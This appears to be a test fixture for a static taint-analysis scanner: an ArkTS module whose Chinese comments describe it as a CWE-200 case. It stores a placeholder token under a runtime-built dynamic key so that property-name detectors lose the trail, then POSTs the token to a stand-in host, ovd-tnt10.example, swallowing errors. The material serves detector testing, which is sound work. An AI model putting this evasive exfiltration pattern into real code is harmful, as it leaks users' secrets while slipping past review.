// VULN: OVD-TNT-010 污点经动态键属性存取外传（反射式访问，CWE-200）
// Record 键由运行期拼接派生，abc 面为 stobjbyvalue/ldobjbyvalue（键在寄存器）——
// 属性名不进 IR，按属性名匹配存取链的检测器在此断流，须追踪键值数据流。
// 孪生 010S 同构动态键仅聚合。
import { http } from '@kit.NetworkKit';

const TOKEN10 = 'tnt10_tok_ovd_5d3a71';

export function t10DynKey(parts: string[]): string {
  let k = '';
  for (let i = 0; i < parts.length; i++) {
    k += parts[i];
  }
  return k;
}

export function ovdT10Source(): string {
  const bag: Record<string, string> = {};
  bag[t10DynKey(['t', '10'])] = TOKEN10;
  return bag[t10DynKey(['t', '10'])];
}

export async function ovdT10Sink(v: string): Promise<string> {
  const req: http.HttpRequest = http.createHttp();
  try {
    await req.request('https://ovd-tnt10.example/ingest', {
      method: http.RequestMethod.POST,
      extraData: v
    });
  } catch (e) {
    // graceful
  } finally {
    req.destroy();
  }
  return 'tnt10 dyn-key sink posted';
}

export async function ovdTnt010(): Promise<string> {
  await ovdT10Sink(ovdT10Source());
  return 'tnt10 dyn-key chain completed';
}
